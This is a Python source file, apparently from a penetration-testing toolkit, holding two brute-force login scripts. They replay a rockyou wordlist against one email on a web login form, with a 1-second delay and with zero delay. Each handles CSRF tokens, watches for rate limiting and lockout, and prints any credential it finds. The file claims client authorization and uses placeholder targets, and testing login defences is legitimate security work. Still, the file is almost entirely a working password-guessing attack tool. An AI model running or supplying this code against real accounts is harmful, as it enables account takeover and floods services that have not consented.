"""
GLITCHICONS ⬡ — Heavy Brute Force
Client authorized: [REDACTED]
Test: 3M rockyou against single high-value target
"""

import requests
import time
import sys
from pathlib import Path
from datetime import datetime, timedelta
from rich.console import Console
from rich.panel import Panel

console = Console()

def brute_force_heavy(
    target="https://target.example.com",
    email="target@example.com",
    password_file=None,
    delay=1.0,
    max_minutes=60,
    output_dir=None
):
    login_url = f"{target}/login"
    login_page = f"{target}/app/login"
    start_time = datetime.now()
    deadline = start_time + timedelta(minutes=max_minutes)

    total_passwords = sum(1 for _ in open(password_file, encoding="utf-8", errors="ignore"))

    console.print(Panel(
        f"[bold red]⬡ GLITCHICONS HEAVY BRUTE FORCE[/bold red]\n"
        f"[dim]Target   : {login_url}[/dim]\n"
        f"[dim]Email    : {email}[/dim]\n"
        f"[dim]Wordlist : {total_passwords:,} passwords[/dim]\n"
        f"[dim]Delay    : {delay}s | Max duration: {max_minutes} min[/dim]\n"
        f"[dim]Started  : {start_time.strftime('%H:%M:%S')}[/dim]",
        border_style="red"
    ))

    # Stats tracking
    attempt = 0
    errors = 0
    lockout_at = None
    rate_limit_at = None
    status_counts = {}
    findings = []

    # Get initial session
    session = requests.Session()
    try:
        r = session.get(login_page, verify=False, timeout=15)
        xsrf = session.cookies.get("XSRF-TOKEN")
        if xsrf:
            from urllib.parse import unquote
            csrf = unquote(xsrf)
        else:
            csrf = ""
    except:
        csrf = ""

    with open(password_file, encoding="utf-8", errors="ignore") as f:
        for password in f:
            password = password.strip()
            if not password:
                continue

            # Check time limit
            if datetime.now() > deadline:
                console.print(f"\n[yellow]⏱ Time limit ({max_minutes} min) reached[/yellow]")
                break

            attempt += 1
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "X-XSRF-TOKEN": csrf,
                "Referer": login_page,
                "Origin": target,
            }

            try:
                r = session.post(
                    login_url,
                    json={"email": email, "password": password},
                    headers=headers,
                    verify=False,
                    timeout=15,
                    allow_redirects=False
                )
                status = r.status_code
                status_counts[status] = status_counts.get(status, 0) + 1

                # Detect lockout / rate limiting
                if status == 429:
                    rate_limit_at = attempt
                    console.print(f"\n[bold green]⬡ RATE LIMIT (429) at attempt {attempt}![/bold green]")
                    console.print(f"[green]  → Server defended after {attempt} attempts[/green]")
                    findings.append({"type": "RATE_LIMIT", "at_attempt": attempt, "password_tried": password})
                    break

                if status in [423, 503]:
                    lockout_at = attempt
                    console.print(f"\n[bold green]⬡ LOCKOUT ({status}) at attempt {attempt}![/bold green]")
                    findings.append({"type": "LOCKOUT", "at_attempt": attempt, "status": status})
                    break

                text_lower = r.text.lower()
                if any(x in text_lower for x in ["too many", "locked", "blocked", "throttle", "captcha"]):
                    lockout_at = attempt
                    console.print(f"\n[bold green]⬡ SOFT BLOCK detected at attempt {attempt}![/bold green]")
                    findings.append({"type": "SOFT_BLOCK", "at_attempt": attempt})
                    break

                # Success
                if status == 200 and "dashboard" in r.text.lower():
                    console.print(f"\n[bold red]⬡ LOGIN SUCCESS: {email}:{password}[/bold red]")
                    findings.append({"type": "CREDENTIAL_FOUND", "email": email, "password": password})
                    break

                # Progress report every 100 attempts
                if attempt % 100 == 0:
                    elapsed = (datetime.now() - start_time).seconds
                    rate = attempt / max(elapsed, 1) * 60
                    console.print(
                        f"  [dim]Attempt {attempt:,} | "
                        f"Status: {status} | "
                        f"Rate: {rate:.0f}/min | "
                        f"Elapsed: {elapsed//60}m{elapsed%60}s[/dim]"
                    )

            except Exception as e:
                errors += 1
                if errors % 10 == 0:
                    console.print(f"[dim red]  Errors: {errors}[/dim red]")
                # Refresh session on repeated errors
                if errors % 20 == 0:
                    session = requests.Session()
                time.sleep(delay)
                continue

            time.sleep(delay)

    # Final report
    elapsed_total = (datetime.now() - start_time).seconds
    console.print(f"\n[bold]⬡ HEAVY BRUTE FORCE COMPLETE[/bold]")
    console.print(f"  Total attempts : [bold]{attempt:,}[/bold]")
    console.print(f"  Duration       : {elapsed_total//60}m {elapsed_total%60}s")
    console.print(f"  Errors         : {errors}")
    console.print(f"  Status codes   : {status_counts}")
    console.print(f"  Rate limit at  : {rate_limit_at or 'NEVER TRIGGERED ⚠️'}")
    console.print(f"  Lockout at     : {lockout_at or 'NEVER TRIGGERED ⚠️'}")

    if not rate_limit_at and not lockout_at:
        console.print(f"\n[bold red]⚠  SERVER DID NOT DEFEND after {attempt:,} attempts[/bold red]")
        findings.append({
            "type": "NO_PROTECTION",
            "total_attempts": attempt,
            "duration_seconds": elapsed_total,
            "severity": "CRITICAL"
        })

    # Save report
    if output_dir:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = out / f"heavy_bruteforce_{ts}.md"
        lines = [
            f"# Heavy Brute Force Report",
            f"- Target   : {login_url}",
            f"- Email    : {email}",
            f"- Started  : {start_time}",
            f"- Attempts : {attempt:,}",
            f"- Duration : {elapsed_total//60}m {elapsed_total%60}s",
            f"- Errors   : {errors}",
            f"- Statuses : {status_counts}",
            f"- Rate limit triggered: {rate_limit_at or 'NO'}",
            f"- Lockout triggered   : {lockout_at or 'NO'}",
            "",
        ]
        for fn in findings:
            lines.append(f"## {fn['type']}")
            for k, v in fn.items():
                lines.append(f"- {k}: {v}")
            lines.append("")
        report.write_text("\n".join(lines))
        console.print(f"\n[dim]Report saved: {report}[/dim]")

    return findings


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")

    brute_force_heavy(
        target="https://target.example.com",
        email="target@example.com",
        password_file="wordlists/rockyou_3m.txt",
        delay=1.0,
        max_minutes=60,
        output_dir="engagements/[CLIENT]/findings/bruteforce"
    )

def brute_force_nodlay(
    target="https://target.example.com",
    email="admin@target.example.com",
    password_file=None,
    max_minutes=10,
    output_dir=None
):
    """Zero delay brute force — client authorized stress test"""
    from datetime import datetime, timedelta
    import requests, time
    from pathlib import Path
    from rich.console import Console
    from rich.panel import Panel

    console = Console()
    start_time = datetime.now()
    deadline = start_time + timedelta(minutes=max_minutes)

    console.print(Panel(
        f"[bold red]⬡ ZERO DELAY STRESS TEST[/bold red]\n"
        f"[dim]Target  : {target}/login[/dim]\n"
        f"[dim]Email   : {email}[/dim]\n"
        f"[dim]Delay   : 0ms (maximum speed)[/dim]\n"
        f"[dim]Duration: {max_minutes} minutes[/dim]",
        border_style="red"
    ))

    session = requests.Session()
    attempt = 0
    errors = 0
    status_counts = {}
    lockout_at = None
    rate_limit_at = None
    peak_rate = 0

    # Get CSRF token
    try:
        r = session.get(f"{target}/app/login", verify=False, timeout=10)
        xsrf = session.cookies.get("XSRF-TOKEN")
        csrf = __import__('urllib.parse', fromlist=['unquote']).unquote(xsrf) if xsrf else ""
    except:
        csrf = ""

    minute_start = datetime.now()
    minute_count = 0

    with open(password_file, encoding="utf-8", errors="ignore") as f:
        for password in f:
            password = password.strip()
            if not password:
                continue

            if datetime.now() > deadline:
                console.print(f"\n[yellow]⏱ {max_minutes} min time limit reached[/yellow]")
                break

            attempt += 1
            minute_count += 1

            # Calculate rate per minute
            elapsed_sec = (datetime.now() - minute_start).seconds
            if elapsed_sec >= 60:
                current_rate = minute_count
                if current_rate > peak_rate:
                    peak_rate = current_rate
                minute_count = 0
                minute_start = datetime.now()

            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "X-XSRF-TOKEN": csrf,
                "Referer": f"{target}/app/login",
                "Origin": target,
            }

            try:
                r = session.post(
                    f"{target}/login",
                    json={"email": email, "password": password},
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                status = r.status_code
                status_counts[status] = status_counts.get(status, 0) + 1

                # Detect rate limiting
                if status == 429:
                    rate_limit_at = attempt
                    console.print(f"\n[bold green]⬡ RATE LIMIT at attempt {attempt:,}![/bold green]")
                    console.print(f"[green]  Server defended after {attempt} attempts[/green]")
                    break

                # Detect lockout
                if any(x in r.text.lower() for x in ["too many", "locked", "blocked", "throttle", "captcha"]):
                    lockout_at = attempt
                    console.print(f"\n[bold green]⬡ SOFT BLOCK at attempt {attempt:,}![/bold green]")
                    break

                # Success
                if status == 200 and "dashboard" in r.text.lower():
                    console.print(f"\n[bold red]⬡ LOGIN SUCCESS![/bold red]")
                    console.print(f"  Password: {password}")
                    break

                # Progress every 500
                if attempt % 500 == 0:
                    elapsed = (datetime.now() - start_time).seconds
                    rate = attempt / max(elapsed, 1) * 60
                    console.print(
                        f"  [dim]Attempt {attempt:,} | "
                        f"Status: {status} | "
                        f"Rate: {rate:.0f}/min | "
                        f"Elapsed: {elapsed//60}m{elapsed%60}s[/dim]"
                    )

            except Exception as e:
                errors += 1
                if errors % 50 == 0:
                    console.print(f"[dim red]  Errors: {errors}[/dim red]")
                    session = requests.Session()
                continue

            # ZERO DELAY — no sleep

    elapsed_total = (datetime.now() - start_time).seconds
    rate_avg = attempt / max(elapsed_total, 1) * 60

    console.print(f"\n[bold]⬡ ZERO DELAY STRESS TEST COMPLETE[/bold]")
    console.print(f"  Total attempts : [bold]{attempt:,}[/bold]")
    console.print(f"  Duration       : {elapsed_total//60}m {elapsed_total%60}s")
    console.print(f"  Average rate   : [bold]{rate_avg:.0f} attempts/min[/bold]")
    console.print(f"  Peak rate      : [bold]{peak_rate}/min[/bold]")
    console.print(f"  Errors         : {errors}")
    console.print(f"  Status codes   : {status_counts}")
    console.print(f"  Rate limit     : {rate_limit_at or 'NEVER TRIGGERED ⚠️'}")
    console.print(f"  Lockout        : {lockout_at or 'NEVER TRIGGERED ⚠️'}")

    if output_dir:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = out / f"zero_delay_{ts}.md"
        report.write_text(
            f"# Zero Delay Stress Test\n"
            f"- Target: {target}/login\n"
            f"- Email: {email}\n"
            f"- Attempts: {attempt:,}\n"
            f"- Duration: {elapsed_total//60}m {elapsed_total%60}s\n"
            f"- Avg Rate: {rate_avg:.0f}/min\n"
            f"- Peak Rate: {peak_rate}/min\n"
            f"- Statuses: {status_counts}\n"
            f"- Rate limit: {rate_limit_at or 'NEVER'}\n"
            f"- Lockout: {lockout_at or 'NEVER'}\n"
        )
        console.print(f"[dim]Report: {report}[/dim]")


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")
    brute_force_nodlay(
        target="https://target.example.com",
        email="admin@target.example.com",
        password_file="wordlists/rockyou_3m.txt",
        max_minutes=10,
        output_dir="engagements/[CLIENT]/findings/bruteforce"
    )
